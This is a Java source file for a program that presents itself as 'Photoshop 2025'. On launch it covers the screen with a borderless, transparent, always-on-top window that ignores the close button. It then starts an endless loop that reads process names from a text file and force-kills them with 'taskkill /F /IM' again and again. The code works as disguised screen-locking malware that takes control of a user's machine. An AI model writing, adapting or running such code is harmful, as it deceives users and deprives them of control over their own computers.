import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.IOException;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;
import java.io.BufferedReader;
import java.io.FileReader;
import java.util.ArrayList;
import java.util.List;

class Main extends JPanel {
    private BufferedImage transparentImage;

    public Main() {
        try {
            transparentImage = ImageIO.read(getClass().getResource("/14.png"));
        } catch (IOException e) {
            e.printStackTrace();
        }
        setOpaque(false);
    }

    @Override
    protected void paintComponent(Graphics g) {
        super.paintComponent(g);

        Graphics2D g2d = (Graphics2D) g.create();
        g2d.drawImage(transparentImage, 0, 0, this);
        g2d.dispose();
    }
}

class TransparentImageApp extends JFrame {
    private static final String ICON_IMAGE_PATH = "/4k21.png";

    public TransparentImageApp() {
        setTitle("Photoshop 2025");
        setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        setSize(2560, 1440);

        try {
            setIconImage(ImageIO.read(getClass().getResource(ICON_IMAGE_PATH)));
        } catch (IOException e) {
            e.printStackTrace();
        }

        setUndecorated(true);
        setBackground(new Color(0, 0, 0, 0));
        setAlwaysOnTop(true);

        Main panel = new Main();
        setContentPane(panel);
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(() -> {
            TransparentImageApp app = new TransparentImageApp();
            app.setVisible(true);
            new rhbm().main2();
        });
    }
}



class rhbm {
    private static final String FILE_PATH = "src/rd5/rasstrel.txt";

    byte i = 125;

    public List<String> readProcessesFromFile() {
        List<String> processNames = new ArrayList<>();
        try (BufferedReader reader = new BufferedReader(new FileReader(FILE_PATH))) {
            String line;
            while ((line = reader.readLine()) != null) {
                processNames.add(line.trim());
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return processNames;
    }

    public void main2() {
        List<String> processNames = readProcessesFromFile();

        while (i == 125) {
            for (String processName : processNames) {

                ProcessBuilder processBuilder = new ProcessBuilder("taskkill", "/F", "/IM", processName);

                try {
                    Process process = processBuilder.start();
                    int ec11 = process.waitFor();


                } catch (IOException | InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    private boolean areProcessesRunning(List<String> processNames) {
        RuntimeMXBean runtimeBean = ManagementFactory.getRuntimeMXBean();
        String processNameWithPID = runtimeBean.getName();

        for (String processName : processNames) {
            if (processNameWithPID.contains(processName)) {
                return true;
            }
        }
        return false;
    }
}
